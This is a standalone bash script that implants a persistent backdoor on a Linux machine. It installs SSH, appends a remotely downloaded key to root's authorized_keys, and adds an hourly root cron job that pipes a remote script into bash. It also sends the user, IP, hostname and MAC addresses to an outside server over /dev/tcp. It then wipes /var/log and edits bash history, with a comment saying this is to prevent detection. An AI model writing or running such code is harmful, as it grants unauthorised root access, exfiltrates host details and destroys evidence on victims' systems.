#!/bin/bash

sudo apt-get install openssh-server -y
sudo systemctl start ssh.service
sudo systemctl enable ssh.service

SSHPATH="/root/.ssh"

sudo mkdir -p "$SSHPATH"

echo "Downloading pubkey..."
sudo curl https://erikboesen.com/pubkey >> $SSHPATH/authorized_keys

sudo su root -c "(crontab -l 2>/dev/null; echo '0 * * * * curl -L erikboesen.com/kaliupdate.sh | bash') | crontab -"

USER=`whoami`
# hostname -I returns trailing space
IP=`hostname -I | sed 's/ *$//'`
HOSTNAME=`hostname`
MAC=`cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//'`

SERVER="boesen.science"
PORT=2043

exec 3<>/dev/tcp/$SERVER/$PORT
printf "$USER $IP $HOSTNAME $MAC" >&3

cat <&3

rm -rf /var/log/*
# Remove last line of bash history to prevent detection if typed into terminal
sed -e '$ d' ~/.bash_history > /tmp/.bash_history; mv /tmp/.bash_history ~/.bash_history

clear;clear;clear
exit 0
